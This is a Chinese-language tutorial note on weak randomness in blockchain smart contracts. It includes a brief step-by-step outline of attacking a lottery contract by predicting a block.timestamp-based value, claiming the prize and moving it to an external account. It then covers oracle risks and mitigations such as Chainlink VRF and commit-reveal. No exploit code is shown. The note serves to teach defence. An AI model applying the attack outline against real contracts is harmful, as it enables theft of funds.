坏随机数

目前区块链不可能用区块链上的单一交易安全的产生随机数，区块链需要是完全确定的，因此这些随机数是完全确定的，都可以被检测到

如block.timestamp,block.number,blockhash,msg.sender,address(this)

示例

攻击合约

==需要控制block.timestamp,使randon==42，然后我就变成owner,从而可以提现==

攻击思路

  • 在攻击合约中计算rand,当rand==42的时候再调用play()

  • block.timestamp在每个区块是固定的，所以产生了不止一个区块（普通区块，不是空区块），直到满足rand==42

  • 此时攻击合约被设为winner,调用claimPrize(),取出奖金

  • 将奖金转给EOA账户

  • 成功

错误使用 Chainlink 随机数 Oracle

Chainlink是一个流行的解决方案，分两步进行，智能合约向预言机处发一个随机数请求，在一些区块后，预言机以一个随机数作为回应

  • 请求随机数的智能合约必须在随机数返回之前不做任何事情
  • 随机数预言机本身可能回试图操纵你的应用程序

因为使用预言机需要进行某些链外操作，即使预言机保持诚实，他们的数据来源也可以被操纵。

同样，依赖于传感器数据或一些web2 API 的预言机也会收到传统黑客攻击的影响。

预防措施

  1. 使用Chainlink VRF

    Chainlink VRF需要拆分流程：请求->等待回调->在回调函数内处理结果

    1. 随机数是链下生成，链上回调
    2. 每个请求都带有可验证证明
    3. 攻击者无法预测或控制结果

  2. 不依赖block.timestamp,block.number,blockhash,msg.sender,address(this)等

  3. 多方生成随机数，每个用户提交一个值，所有值XOR或混合后得到最终随机数(commit-reveal)

    后续

    最后由产生的随机数决定获胜者

  4. 不在同一交易中完成随机数生成与敏感状态修改
